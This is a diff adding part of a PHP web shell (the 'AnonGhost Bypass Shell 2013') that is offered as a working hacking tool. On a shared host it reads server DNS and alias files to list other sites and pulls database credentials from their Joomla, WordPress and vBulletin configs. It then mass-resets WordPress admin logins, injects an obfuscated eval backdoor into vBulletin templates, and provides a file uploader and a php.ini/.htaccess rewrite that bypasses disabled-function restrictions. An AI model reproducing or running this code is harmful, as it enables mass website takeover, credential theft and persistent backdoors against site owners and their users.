+$domins = trim($domin).'';
+
+echo "<tr>
+<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
+<td><div class='cone'><a target='_blank' href='$config'>config</a></td><td>".$r."</td></div></tr>";
+flush();
+
+
+
+}else{
+
+echo "<tr>
+<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
+<td><div class='cone'><a target='_blank' href='http://$exp'>config</a></div></td><td><b style='color:red'>failed</b></td></tr>";
+flush();
+
+}
+
+}
+
+
+
+
+
+
+
+
+
+die();
+
+}
+
+if(!is_file('named.txt')){
+
+$d00m = @file("/etc/named.conf");
+
+flush();
+
+
+}else{
+
+$d00m = file("named.txt");
+
+
+}
+if(!$d00m)
+{
+
+                die ("<meta http-equiv='refresh' content='0; url=?vw=read'/>");
+}
+else
+
+{
+echo "<br><b class='cont' align='center'><font face='Tahoma' color='#009900' size='3pt'>Mass Joomla</font></b><br><br><div class='tmp'>
+<form method='POST' action='$pg?vw=joomla'>
+<input type='submit' value='Mass change Admin' />
+<input type='hidden' value='1' name='s' />
+</form><br>
+<table align='center' width='40%'><td> <font color='#b3b3b3'><b>Domains </b></font></td><td> <font color='#b3b3b3'><b>config </b></font></td><td> <font color='#b3b3b3'><b>Result </b></font></td>";
+
+$f = fopen('joomla.txt','w');
+
+foreach($d00m as $dom){
+
+if(eregi("zone",$dom)){
+
+preg_match_all('#zone "(.*)"#', $dom, $domvw);
+
+if(strlen(trim($domvw[1][0])) > 2){
+
+$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));
+
+
+$wpl=$pageURL."/sim/rut/home/".$user['name']."/public_html/configuration.php";
+$wpp=get_headers($wpl);
+$wp=$wpp[0];
+
+$wp2=$pageURL."/sim/rut/home/".$user['name']."/public_html/blog/configuration.php";
+$wpp2=get_headers($wp2);
+$wp12=$wpp2[0];
+
+$wp3=$pageURL."/sim/rut/home/".$user['name']."/public_html/joomla/configuration.php";
+$wpp3=get_headers($wp3);
+$wp13=$wpp3[0];
+
+
+$pos = strpos($wp, "200");
+$config="&nbsp;";
+
+if (strpos($wp, "200") == true )
+{
+ $config= $wpl;
+}
+elseif (strpos($wp12, "200") == true)
+{
+  $config= $wp2;
+}
+elseif (strpos($wp13, "200") == true)
+{
+  $config= $wp3;
+}
+else
+{
+continue;
+
+}
+flush();
+
+$dom = $domvw[1][0];
+
+$w = fwrite($f,"$config||$dom 
+");
+if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
+
+
+echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
+<td><div class='cone'><a href='$config'>config</a></div></td><td>".$r."</td></tr>";
+
+
+
+
+
+flush();
+
+
+}
+}
+}
+}
+echo "</table></div><br><br>";
+
+break;
+
+case 'wp':
+
+if(isset($_POST['s'])){
+
+$file = @file_get_contents('wp.txt');
+
+$ex   = explode("
+",$file);
+
+echo "<div class='tmp'><table align='center' width='40%'><td> <font color='#b3b3b3'><b>Domains </b></font></td><td> <font color='#b3b3b3'><b>Configs </b></font></td><td> <font color='#b3b3b3'><b>Result </b></font></td></div>";
+flush();
+flush();
+
+
+foreach ($ex as $exp){
+
+$es   = explode("||",$exp);
+
+$config = $es[0];
+
+$domin = $es[1];
+
+$domins = trim($domin).'';
+
+$readconfig  = @file_get_contents(trim($config));
+
+if(ereg('wp-settings.php',$readconfig)){
+
+
+
+$pass    =  ex($readconfig,"define('DB_PASSWORD', '","');");
+
+$userdb  =  ex($readconfig,"define('DB_USER', '","');");
+
+$db      =  ex($readconfig,"define('DB_NAME', '","');");
+
+$fix     =  ex($readconfig,'$table_prefix  = \'',"';");
+
+$tab     = $fix.'users';
+
+$con     = @mysql_connect('localhost',$userdb,$pass);
+
+$db      = @mysql_select_db($db,$con);
+
+$query   = @mysql_query("UPDATE `$tab` SET `user_login` ='virusa'") or die;
+
+$query   = @mysql_query("UPDATE `$tab` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;
+
+
+
+if ($query){$r = '<b style="color: #006600">Succeed </b>user [virusa] pass [1]</b>';}
+
+else
+
+{
+
+$r = '<b style="color:red">failed</b>';
+
+}
+
+$domins = trim($domin).'';
+
+echo "<tr>
+<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
+<td><div class='cone'><a target='_blank' href='$config'>config</a></div></td><td>".$r."</td></tr>";
+
+flush();
+flush();
+
+
+
+
+
+
+}else{
+
+echo "<tr>
+<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
+<td><div class='cone'><a target='_blank' href='http://$config'>config</a></div></td><td><b style='color:red'>failed2</b></td></tr>";
+
+flush();
+flush();
+
+}
+
+}
+
+
+
+
+
+
+
+
+
+
+die();
+
+}
+
+if(!is_file('named.txt')){
+
+$d00m = @file("/etc/named.conf");
+
+}else{
+
+$d00m = @file("named.txt");
+
+
+}
+if(!$d00m)
+{
+
+                die ("<meta http-equiv='refresh' content='0; url=?vw=read'/>");
+}
+else
+
+{
+echo "<br><b class='cont' align='center'><font face='Tahoma' color='#009900' size='3pt'>Mass WordPress</font></b><br><br><div class='tmp'>
+<form method='POST' action='$pg?vw=wp'>
+<input type='submit' value='Mass Change Admin' />
+<input type='hidden' value='1' name='s' />
+</form>
+<br>
+<table align='center' width='40%'><td> <font color='#b3b3b3'><b>Domains </b></font></td><td> <font color='#b3b3b3'><b>config </b></font></td><td> <font color='#b3b3b3'><b>Result </b></font></td>";
+
+flush();
+flush();
+
+$f = fopen('wp.txt','w');
+
+foreach($d00m as $dom){
+
+if(eregi("zone",$dom)){
+
+preg_match_all('#zone "(.*)"#', $dom, $domvw);
+
+if(strlen(trim($domvw[1][0])) > 2){
+
+$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));
+
+
+$wpl=$pageURL."/sim/rut/home/".$user['name']."/public_html/wp-config.php";
+$wpp=get_headers($wpl);
+$wp=$wpp[0];
+
+$wp2=$pageURL."/sim/rut/home/".$user['name']."/public_html/blog/wp-config.php";
+$wpp2=get_headers($wp2);
+$wp12=$wpp2[0];
+
+$wp3=$pageURL."/sim/rut/home/".$user['name']."/public_html/wp/wp-config";
+$wpp3=get_headers($wp3);
+$wp13=$wpp3[0];
+
+
+$pos = strpos($wp, "200");
+$config="&nbsp;";
+
+if (strpos($wp, "200") == true )
+{
+ $config= $wpl;
+}
+elseif (strpos($wp12, "200") == true)
+{
+  $config= $wp2;
+}
+elseif (strpos($wp13, "200") == true)
+{
+  $config= $wp3;
+}
+else
+{
+continue;
+
+}
+flush();
+
+
+$dom = $domvw[1][0];
+
+$w = fwrite($f,"$config||$dom 
+");
+if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
+
+
+echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
+<td><div class='cone'><a href='$config'>config</a></div></td><td>".$r."</td></tr>";
+flush();
+flush();
+
+
+
+
+
+flush();
+
+
+}
+}
+}
+}
+echo "</table></div><br><br>";
+
+break;
+
+
+case 'vb':
+
+
+if(isset($_POST['s'])){
+
+
+
+$file = @file_get_contents('vb.txt');
+
+$ex   = explode("
+",$file);
+
+echo "<div class='tmp'><table align='center' width='40%'><td> <font color='#b3b3b3'><b>Domains </b><font></td><td> <font color='#b3b3b3'><b>Configs </b><font></td><td> <font color='#b3b3b3'><b>Result </b><font></td></div>";
+
+
+foreach ($ex as $exp){
+
+$es   = explode("||",$exp);
+
+$config = $es[0];
+
+$domin = $es[1];
+
+$domins = trim($domin).'';
+
+$readconfig  = @file_get_contents(trim($config));
+
+if(ereg('vBulletin',$readconfig)){
+
+
+
+$db      =  ex($readconfig,'$config[\'Database\'][\'dbname\'] = \'',"';");
+
+$userdb  =  ex($readconfig,'$config[\'MasterServer\'][\'username\'] = \'',"';");
+
+$pass    =  ex($readconfig,'$config[\'MasterServer\'][\'password\'] = \'',"';");
+
+$con     = @mysql_connect('localhost',$userdb,$pass);
+
+$db      = @mysql_select_db($db,$con);
+
+$shell   = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;
+
+$crypt  = "{\${eval(gzinflate(base64_decode(\'";
+
+$crypt .= "$shell";
+
+$crypt .= "\')))}}{\${exit()}}</textarea>";
+
+$sqlfaq = "UPDATE template SET template ='".$crypt."' WHERE title ='FAQ'" ;
+
+$query  = @mysql_query($sqlfaq,$con);
+
+
+
+if ($query){$r = '<b style="color: #006600">Succeed</b> shell in search.php';}
+
+else
+
+{
+
+$r = '<b style="color:red">failed</b>';
+
+}
+
+$domins = trim($domin).'';
+
+echo "<tr>
+<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
+<td><div class='cone'><a target='_blank' href='$config'>config</a></div></td><td>".$r."</td></tr>";
+
+
+
+
+
+
+
+}else{
+
+echo "<tr>
+<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
+<td><div class='cone'><a target='_blank' href='http://$config'>config</a></div></td><td><b style='color:red'>failed2</b></td></tr>";
+}
+
+}
+
+
+
+
+
+
+
+
+
+
+die();
+
+}
+
+if(!is_file('named.txt')){
+
+$d00m = file("/etc/named.conf");
+
+}else{
+
+$d00m = file("named.txt");
+
+
+}
+if(!$d00m)
+{
+
+                die ("<meta http-equiv='refresh' content='0; url=?vw=read'/>");
+}
+else
+
+{
+echo "<br><b class='cont' align='center'><font face='Tahoma' color='#009900' size='3pt'>Mass vBulletin</font></b><br><br><div class='tmp'>
+<form method='POST' action='$pg?vw=vb'>
+<input type='submit' value='Inject shell' />
+<input type='hidden' value='1' name='s' />
+</form>
+<br>
+<table align='center' width='40%'><td> <font color='#b3b3b3'><b>Domains </b></font></td><td> <font color='#b3b3b3'><b>config </b></font></td><td> <font color='#b3b3b3'><b>Result </b></font></td>";
+
+$f = fopen('vb.txt','w');
+
+foreach($d00m as $dom){
+
+if(eregi("zone",$dom)){
+
+preg_match_all('#zone "(.*)"#', $dom, $domvw);
+
+if(strlen(trim($domvw[1][0])) > 2){
+
+$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));
+
+///////////////////////////////////////////////////////////////////////////////////
+
+$wpl=$pageURL."/sim/rut/home/".$user['name']."/includes/config.php";
+$wpp=get_headers($wpl);
+$wp=$wpp[0];
+
+$wp2=$pageURL."/sim/rut/home/".$user['name']."/vb/includes/config.php";
+$wpp2=get_headers($wp2);
+$wp12=$wpp2[0];
+
+$wp3=$pageURL."/sim/rut/home/".$user['name']."/forum/includes/config.php";
+$wpp3=get_headers($wp3);
+$wp13=$wpp3[0];
+
+
+ ////////// vb ////////////
+
+$pos = strpos($wp, "200");
+$config="&nbsp;";
+
+if (strpos($wp, "200") == true )
+{
+ $config= $wpl;
+}
+elseif (strpos($wp12, "200") == true)
+{
+  $config= $wp2;
+}
+elseif (strpos($wp13, "200") == true)
+{
+  $config= $wp3;
+}
+else
+{
+continue;
+
+}
+flush();
+$dom = $domvw[1][0];
+$w = fwrite($f,"$config||$dom 
+");
+if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
+echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
+<td><div class='cone'><a href='$config'>config</a></div></td><td>".$r."</td></tr>";
+flush();
+}
+}
+}
+}
+echo "</table></div><br><br>";
+break;
+case 'aplot':
+echo '
+<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Uploader</font></b><br><br><center>';
+echo '<br /><br /><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" value="Choose file" size="60" > <input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<br /><br /><b>upload sukses.. <img src="http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif"><br><br>'; }
+	else { echo '<br /><br />aseeeemmm.., ora iso upload <img src="http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/24.gif"><br><br>'; }
+}
+break;
+case 'abot':
+echo '
+<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Sekilas Info</font></b><br><br><br><br><center>
+<center>
+  '.base64_decode("PGltZyBzcmM9Imh0dHA6Ly9pOTUyLnBob3RvYnVja2V0LmNvbS9hbGJ1bXMvYWUxL3ZpcnVzYXdvcm0vYWdoX3pwczJmNGRkNjhiLmpwZyIgLz4=").'
+<br><br><font color="#006600" size="1pt">Coded by </font><font  color="#00aa00" size="1pt">Virusa Worm</font> <font color="#b0b000" size="1pt">-</font> <font color="#006600" size="1pt">Idea by </font><font color="#009900" size="1pt">Mauritania Attacker</font><br><br><br><br><font color="#00aa00" size="1pt">AnonGhost Bypass </font><font face="Tahoma" color="#b3b3b3" size="1pt">Shell 2013</font> <font color="#006600" size="1pt">include Several script which has recoded to make this shell.</font><br><br><font color="#006600" size="1pt">so.. try to figure it out if this shell not work in different server, and use ur brain.<br>learn to figure it out about something it\'s make be better. mbuh ngomong opo iki.. lol..<br>yen ono seng salah yo tulong dibenerke, tapi yen bener yo ojo disalahke.. kan iso sinau bareng.. wkkwk..<br><br><font color="#b0b000" size="1pt">"</font>tools not make hacker, but try to learn about tools. tried to find out why it\'s tool works. it\'s will be better than nothing.. <font color="#b0b000" size="1pt">"</font><br><br><br><font color="#006600" size="1pt">Special thankz to : </font><br><font color="#009900" size="1pt">My best Brother Mauritania Attacker<br><br><br><br><font color="#006600" size="1pt">thankz to : </font><br>
+All Members AnonGhost Team - <font color="#006600" size="1pt">[ </font>Tanpa Bicara - Maniak k4Sur </font><font color="#006600" size="1pt">[pasangan galo.. lol..]]</font><br><br><font color="#006600" size="1pt">Greetz to :</font><br><font color="#b0b000" size="1pt">AnonGhost - Mauritania HaCker Team - X-Blackerz INC - ZHC - All Muslim Hackers </font></center><br><br>
+';
+break;
+case 'mati':
+		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', 'index.php')))
+			die('<br><br><b class="tmp"><font color="#ff0000" size="2pt">Shell has been Killed... gut bai..</font></b><meta http-equiv="refresh" content="3; url=?".$pwd."" />');
+		else
+			echo '<font color="#ff0000" size="2pt">unlink error!</font>';
+break;
+case 'metu':
+unset($_SESSION['login']); echo "<meta http-equiv='refresh' content='3; url=?".$pwd."' />";
+echo '<br><br><center><font color="#d0d000" size="2pt">Logout out.</font></center>';
+break;
+default:
+header("Location: $pg");
+}
+}else
+{
+if($_POST['pateni']=='sikat'){
+@error_reporting(0);
+$phpini =
+'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
+$file = fopen("php.ini","w+");
+$write = fwrite ($file ,base64_decode($phpini));
+fclose($file);
+$htaccess =
+'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
+$file = fopen(".htaccess","w+");
+$write = fwrite ($file ,base64_decode($htaccess));
+echo '<meta http-equiv="refresh" content="2; url=?'.$pwd.'" /><br><br><br><font face="Tahoma" color="#00bb00" size="3pt"><b>Bypassed !</b>';
+exit;
+}
+echo '
+<br><center><font face="Tahoma" color="#006600" size="2pt"><b>Disable Function :
+<form method="POST">
+<input name="pateni" type="hidden" value="sikat">';
+
+if(''==($func=@ini_get('disable_functions')))
+{
+echo "<font color=#00aa00>No Security for Function</font>";
+}else{
+echo '<font color=#d0d000>[ <blink>Please Bypass First!</blink> ]</font><br>';
+echo "<font color=red>$func</font>";
+
+echo '<br><br><input type="submit" value="Bypass Disable Function">';
+}
+echo '</b></font></center><br>';
+echo '<br><center>
+  '.base64_decode("PGltZyBzcmM9Imh0dHA6Ly9pOTUyLnBob3RvYnVja2V0LmNvbS9hbGJ1bXMvYWUxL3ZpcnVzYXdvcm0vYWdoX3pwczJmNGRkNjhiLmpwZyIgLz4=").'
+<br><br><font face="Tahoma" color="#006600" size="1pt">Coded by </font><font face="Tahoma" color="#00bb00" size="1pt">Virusa Worm</font>  <font color="#b0b000" size="1pt">-</font> <font color="#006600" size="1pt">Idea by </font><font color="#009900" size="1pt">Mauritania Attacker</font><br><br><br><br><br><font color="#006600" size="1pt">Special thankz to : </font><br><font color="#009900" size="1pt">My best Brother Mauritania Attacker<br><br><br><br><font color="#006600" size="1pt">thankz to : </font><br>
+All Members AnonGhost Team - <font color="#006600" size="1pt">[ </font>Tanpa Bicara - Maniak k4Sur </font><font color="#006600" size="1pt">[pasangan galo.. lol..]]</font><br><br><font color="#006600" size="1pt">Greetz to :</font><br><font color="#b0b000" size="1pt">AnonGhost - Mauritania HaCker Team - X-Blackerz INC - ZHC - All Muslim Hackers</font></center>';
+}
+function ex($text,$a,$b){
+$explode = explode($a,$text);
+$explode = explode($b,$explode[1]);
+return $explode[0];
+}
+echo '</div>
+<footer id="det" style="position:fixed; left:0px; right:0px; bottom:0px; background:rgb(21,21,21); text-align:center; border-top: 1px solid #009900; border-bottom: 1px solid #009900"><font color=#009900 size=1 face="Tahoma">'.base64_decode("JmNvcHk7IEFub25HaG9zdCBCeXBhc3MgU2hlbGwgMjAxMyAtIENvZGVkIGJ5IFZpcnVzYSBXb3Jt").'</font></footer>
+</body></html>';
+?>
